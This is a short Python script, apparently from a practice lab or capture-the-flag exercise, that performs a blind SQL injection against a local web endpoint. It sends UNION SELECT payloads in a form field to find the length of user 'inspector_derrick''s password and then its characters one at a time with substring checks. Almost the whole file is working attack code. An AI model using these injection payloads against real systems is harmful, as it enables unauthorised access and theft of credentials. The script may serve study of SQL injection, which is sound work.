from bs4 import BeautifulSoup
import string
import random
import requests
from requests.exceptions import HTTPError

url = "http://127.0.0.1:80/messages"



# # First, find out the length of the password using a binary search algorithm
# response = requests.post(url,
# data={'name': "inspector_derrick' union select name,password from users where name like 'inspector_derrick' \
#                 and length(password)>10 and '1'='1"})

# data={'name': "inspector_derrick' union select name,password from users where name like 'inspector_derrick' \
#                 and length(password)<20 and '1'='1"})

# data={'name': "inspector_derrick' union select name,password from users where name like 'inspector_derrick' \
#                 and length(password)=17 and '1'='1"})

# Second, find out the characters from the password, letter by letter using substring(password, 1, nr_chars_found)
# Obs: substring first char starts from 1

print(''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6)))
response = requests.post(url, data={'name': "inspector_derrick' union select name,password from users where name like 'inspector_derrick' \
                and length(password)=17 and substring(password, 1, 2)='0c' and '1'='1"})

soup = BeautifulSoup(response.text, 'html.parser')

print(response)
if (str(soup.body).find("success") != -1):
    print("Success!")
